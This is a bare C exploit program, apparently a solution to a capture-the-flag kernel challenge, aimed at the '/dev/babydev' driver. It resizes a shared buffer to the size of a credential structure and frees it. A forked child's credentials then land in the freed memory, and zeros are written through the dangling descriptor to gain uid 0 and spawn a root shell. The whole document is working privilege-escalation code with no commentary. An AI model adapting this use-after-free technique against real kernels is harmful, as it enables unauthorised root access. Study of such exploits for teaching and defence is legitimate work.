#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    pid_t pid;

    ioctl(fd1, 0x10001, 0xa8);
    close(fd1);

    if ((pid = fork()) == 0) {
        char zero[36] = {0};
        write(fd2, zero, sizeof(zero));
        if (getuid() == 0) {
            system("/bin/sh");
            exit(0);
        }
    }
    else if (pid > 0)  {
        wait(NULL);
    }
    else {
        printf("Fork failed!\n");
    }
    close(fd2);

    return 0;
}